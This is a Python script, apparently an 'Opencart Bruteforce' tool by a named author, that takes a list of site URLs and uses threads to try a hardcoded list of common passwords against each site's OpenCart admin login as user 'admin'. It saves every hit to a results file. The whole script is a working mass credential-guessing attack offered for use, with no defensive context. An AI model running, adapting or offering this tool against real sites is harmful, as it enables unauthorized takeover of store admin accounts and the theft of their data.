import requests as r
import os
import sys
from platform import system
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool

# Regular Colors
R = "\033[0;31m"          # Red
G = "\033[0;32m"        # Green
Y = "\033[0;33m"       # Yellow
B = "\033[0;34m"         # Blue
P = "\033[0;35m"       # Purple
C = "\033[0;36m"         # Cyan
W = "\033[0;37m"        # White
# Regular Colors

if system() == 'Linux':
	os.system('clear')
if system() == 'Windows':
	os.system('cls')

banner = '''
 _____                                 _   
|  _  |                               | |  
| | | |_ __   ___ _ __   ___ __ _ _ __| |_ 
| | | | '_ \ / _ \ '_ \ / __/ _` | '__| __|
\ \_/ / |_) |  __/ | | | (_| (_| | |  | |_ 
 \___/| .__/ \___|_| |_|\___\__,_|_|   \__|
      | |    Bruteforce                              
      |_|    Coded by bL@cKID                              
             FB : https://www.facebook.com/bLacKIDr007
'''

def brute(url):
    password = ["123", "1", "admin", "123456", "pass", "password", "admin123", "12345", "admin@123", "123", "test", "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz", "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "admin1234", "logitech", "p@ssw0rd", "login", "test123", "root", "pass123", "password1", "qwerty", "111111", "gimboroot"]
    for passwd in password:
        try:
            url = url.strip()
            head = {'User-Agent' : 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0'}
            payload = {'username':'admin', 'password': passwd}
            login = r.post(url + '/admin/index.php?route=common/login', headers = head, data = payload, timeout=7)
            if 'common/logout' in login.text:
                print( C + url + "|" + "admin" + "|" + passwd + "[SUCCESS]" )
                open('result_opencart.txt', 'a').write(url + '|' + 'admin' + '|' + passwd + '\n')
            else:
                print( R + url + "|" + "admin" + "|" + passwd + "[FAILED]" )
        except:
            pass


def main():
    listsite = open(sys.argv[1], 'r').readlines()
    try:
        ThreadPool = Pool(10)
        ThreadPool.map(brute, listsite)
    except:
        pass


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print G + banner
        print("Usage : python " + sys.argv[0] + " list.txt")
    else:
        print G + banner
        main()
